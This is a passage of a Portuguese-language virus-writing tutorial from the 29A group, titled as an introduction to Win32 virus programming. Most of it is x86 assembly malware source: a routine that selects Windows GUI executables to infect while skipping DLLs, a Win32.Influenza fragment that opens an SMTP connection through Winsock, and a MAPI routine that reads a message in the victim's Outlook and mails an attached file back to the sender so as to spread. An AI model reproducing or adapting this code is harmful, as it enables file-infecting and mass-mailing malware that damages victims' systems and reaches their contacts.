+                ; executável. Permitir somente executáveis para Intel i386
+
+                cmp word ptr [esi+FH_Machine],IMAGE_FILE_MACHINE_I386
+                jne inf_close_file
+
+                ; Olhamos as características para comprovar que se trata de um executável
+
+                mov ax,word ptr [esi+FH_Characteristics]
+                test ax,IMAGE_FILE_EXECUTABLE_IMAGE
+                jz inf_close_file
+
+                ; Evitamos infectar DLL's
+
+                test ax,IMAGE_FILE_DLL
+                jnz inf_close_file
+
+                ; Infectar apenas aplicações gráficas, e não as de console
+                                
+                cmp word ptr [esi+                                        \
+                              IMAGE_SIZEOF_FILE_HEADER+                   \
+                              OH_Subsystem],IMAGE_SUBSYSTEM_WINDOWS_GUI
+                                                                        
+                jne inf_close_file
+
+
+  ---------------------
+  Tem mensagem pra você
+  ---------------------
+
+  Quem ainda não brincou enviando um email utilizando um cliente TELNET?
+  É bem fácil, nos conectamos a porta 25 (SMTP) do servidor de correio e
+  vamos enviando os comandos necessários para construir uma mensagem, a
+  saber:
+
+                220 mail.servidor.qualquer SMTP/smap Ready.
+                helo servidor.meu
+                250 (servidor.meu) pleased to meet you.
+                mail from: <usuario@servidor.meu>
+                250 <usuario@servidor.meu>... Sender Ok
+                rcpt to: <destinatario@servidor.seu>
+                250 <destinatario@servidor.seu> OK
+                data
+                354 Enter mail. end with "." on a line by itself.
+                from: usuario <usuario@servidor.meu>
+                to:  destinatario <destinatario@servidor.seu>
+                subject: Este e' o assunto
+             
+                Este e' o corpo da mensagem
+                .
+                250 Mail accepted
+                quit
+                221 Closing connection
+
+  Pois é exatamente isto que um vírus tem que fazer para gerar uma
+  mensagem de correio eletrônico. Com a ajuda das funções do
+  WINSOCK.DLL podemos realizar estas operações. Implementar um 'daemon'
+  SMTP (Simple Mail Transfer Protocol) em assembly não é tarefa fácil,
+  vejamos como exemplo um fragmento do vírus Win32.Influenza, no qual 
+  encontramos um exemplo de como se conectar com o servidor de email:
+
+
+                lea eax,dword ptr [ebp+WSA_data]                ; Iniciar WINSOCK
+                push eax                                        ;
+                push 00000101h                                  ;
+                call dword ptr [ebp+a_WSAStartup]               ;
+                or eax,eax                                      ; Error ?
+                jnz WSA_CleanUp                                 ;
+                lea eax,dword ptr [ebp+host_name]               ; Obter host a partir de
+                push eax                                        ; seu nome
+                call dword ptr [ebp+a_gethostbyname]            ;
+                or eax,eax                                      ; Error ?
+                jz WSA_CleanUp                                  ;
+                cld                                             ;
+                lea esi,dword ptr [eax+00000008h]               ;
+                lea edi,dword ptr [ebp+SockAddrIn]              ;
+                push edi                                        ;
+                movsw                                           ;
+                push 25                                         ; Porta SMTP
+                call dword ptr [ebp+a_htons]                    ; Converter byte-order
+                cld                                             ;
+                stosw                                           ;
+                lodsw                                           ;
+                movzx ecx,ax                                    ;
+                lodsd                                           ;
+                mov esi,dword ptr [eax]                         ;
+                rep movsb                                       ; Preparar SockAddrIn
+                push ecx                                        ;
+                push SOCK_STREAM                                ; Usar TCP
+                push AF_INET                                    ; Internet
+                call dword ptr [ebp+a_socket]                   ; Criamos o socket
+                pop edi                                         ;
+                cmp eax,00000000h                               ; Erro ?
+                jl WSA_CleanUp                                  ;
+                mov dword ptr [ebp+conn_sock],eax               ; Guardar descriptor
+                push SizeOfAddrIn                               ;
+                push edi                                        ;
+                push eax                                        ;
+                call dword ptr [ebp+a_connect]                  ; Conectar
+                cmp eax,0FFFFFFFFh                              ; Erro ?
+                je Disconnect                                   ;
+
+
+  A definição das estruturas utilizadas no exemplo anterior, como
+  WSA_data ou SockAddrIn, podem ser encontradas nos arquivos "includes"
+  de nosso compilador C favorito... ou no Win32 SDK da Microsoft, onde
+  aparecem com informações detalhadas sobre sua utilização. O único
+  inconveniente é que temos que portar tudo para assembly, mas também
+  se tem uma vantagem, tente escrever a mesma função em C e compare o
+  tamanho dos executáveis resultantes.
+
+  Uma forma de enviar email, simples e eficaz apesar de ser um tanto
+  descarada, já encontramos no seguinte código, que utiliza funções de
+  MAPI:
+
+                ; Registrar nossa seção MAPI
+
+                lea eax,dword ptr [ebp+hMAPISession]
+                push eax                                    ;lppSession
+                push 00000000h                              ;ulReserved
+                push 00000020h or 00008000h                 ;flFlags
+                push 00000000h                              ;lpszPassword
+                push 00000000h                              ;lpszProfileName
+                push 00000000h                              ;ulUIParam
+                call dword ptr [ebp+a_MAPILogon]
+                or eax,eax
+                jnz freeMAPI32
+
+                ; Buscar uma mensagem qualquer dentro das pastas do Outlook
+
+                lea eax,dword ptr [ebp+MessageID]
+                push eax                                    ;lpszMessageID
+                push 00000000h                              ;ulReserved 
+
+                ;MAPI_LONG_MSGID = 00004000h
+
+                push 00004000h                              ;flFlags
+                push 00000000h                              ;lpszSeedMessageID 
+                push 00000000h                              ;lpszMessageType
+                push 00000000h                              ;ulUIParam 
+                push dword ptr [ebp+hMAPISession]           ;lhSession
+                call dword ptr [ebp+a_MAPIFindNext]
+                or eax,eax
+                jnz logoutMAPI32
+
+                ; Pegamos a mensagem
+
+                lea eax,dword ptr [ebp+MessagePtr]
+                push eax                                    ;lppMessage
+                push 00000000h                              ;ulReserved
+
+                ;MAPI_ENVELOPE_ONLY = 00000040
+                ;MAPI_PEEK                      = 00000080h
+
+                push 00000080h or 00000040h                 ;flFlags                                                                                                            
+                lea eax,dword ptr [ebp+MessageID]
+                push eax                                    ;lpszMessageID
+                push 00000000h                              ;ulUIParam 
+                push dword ptr [ebp+hMAPISession]           ;lhSession
+                call dword ptr [ebp+a_MAPIReadMail]
+
+                ; Construímos uma nova mensagem utilizando parte da informação
+                ; obtida da mensagem anterior
+
+                cld
+                lea edi,dword ptr [ebp+MapiMessage]
+                xor eax,eax
+                stosd                                       ;ulReserved
+                lea eax,dword ptr [ebp+szSubject]
+                stosd                                       ;lpszSubject
+                lea eax,dword ptr [ebp+szNoteText]
+                stosd                                       ;lpszNoteText
+                xor eax,eax
+                stosd                                       ;lpszMessageType
+                lea eax,dword ptr [ebp+szDate]
+                stosd                                       ;lpszDate
+                xor eax,eax
+                stosd                                       ;lpszConversationID
+                mov eax,00000002h ;MAPI_RECEIPT_REQUESTED 
+                stosd                                       ;flFlags
+                lea eax,dword ptr [ebp+MsgFrom]
+                stosd                                       ;lpOriginator
+                mov eax,00000001h
+                stosd                                       ;nRecipCount
+                lea eax,dword ptr [ebp+MsgTo]
+                stosd                                       ;lpRecips
+                mov eax,00000001h
+                stosd                                       ;nFileCount
+                lea eax,dword ptr [ebp+MapiFileDesc]
+                stosd                                       ;lpFiles
+
+                ; Origem da mensagem
+                                
+                xor eax,eax                                 ;ulReserved 
+                stosd
+                stosd                                       ;ulRecipClass 
+
+                lea eax,dword ptr [ebp+szNameFrom]              
+                stosd                                       ;lpszName
+                lea eax,dword ptr [ebp+szMailFrom]              
+                stosd                                       ;lpszAddress
+                xor eax,eax
+                stosd                                       ;ulEIDSize
+                stosd                                       ;lpEntryID
+
+                ; Destino da mensagem
+
+                stosd                                       ;ulReserved 
+                inc eax ;MAPI_TO
+                stosd                                       ;ulRecipClass
+
+                mov esi,dword ptr [ebp+MessagePtr]
+                add esi,0000001Ch                           ; Ir para originator
+                lodsd
+                lea esi,dword ptr [eax+00000008h]
+                movsd
+                movsd
+
+                xor eax,eax
+                stosd                                       ;ulEIDSize
+                stosd                                       ;lpEntryID
+
+                ; Indicamos o arquivo que queremos incluir junto com a mensagem
+
+                stosd                                       ;ulReserved
+                stosd                                       ;flFlags
+                mov eax,00000000h
+                stosd                                       ;nPosition
+                lea eax,dword ptr [ebp+szFileAttach]
+                stosd                                       ;lpszPathName
+                lea eax,dword ptr [ebp+szFileMsg]
+                stosd                                       ;lpszFileName
+                xor eax,eax
+                stosd                                       ;lpFileType
+
+                ; E finalmente enviamos a mensagem
+
+                push 00000000h
+                push 00000000h
+                lea eax,dword ptr [ebp+MapiMessage]
+                push eax
+                push 00000000h
+                push dword ptr [ebp+hMAPISession]
+                call dword ptr [ebp+a_MAPISendMail]
+
+                ; Antes de terminar é necessário liberar a memória que
+                ; estava reservada por MAPI
+
+                push dword ptr [ebp+MessagePtr]
+                call dword ptr [ebp+a_MAPIFreeBuffer]
+
+                ; Somos educados, nos despedimos
+
+logoutMAPI32:   push 00000000h
+                push 00000000h
+                push 00000000h
+                push dword ptr [ebp+hMAPISession]
+                call dword ptr [ebp+a_MAPILogoff]                                               
+
+                ; Liberamos MAPI32.DLL para terminar
+
+freeMAPI32:     push dword ptr [ebp+hMAPI32]
+                call FreeLibrary
+
+
+                               . . .
+
+
+  Na minha página pessoal você poderá encontrar informações detalhadas
+  sobre o funcionamento de cada um destes vírus, além de artigos, tutoriais,
+  notíciais e utilitários. A URL é:
+
+  BioTech( http://www.geocities.com/Area51/Corridor/2618 ) 
+  
+  Por GriYo / 29A
+  http://www.29a.net/
+  http://www.geocities.com/Area51/Corridor/2618
+  griyo@akrata.org
+
+
+  --------------------------------------------------------------------
+  Virtualis nº9 -- Introdução a programação de vírus em Win32
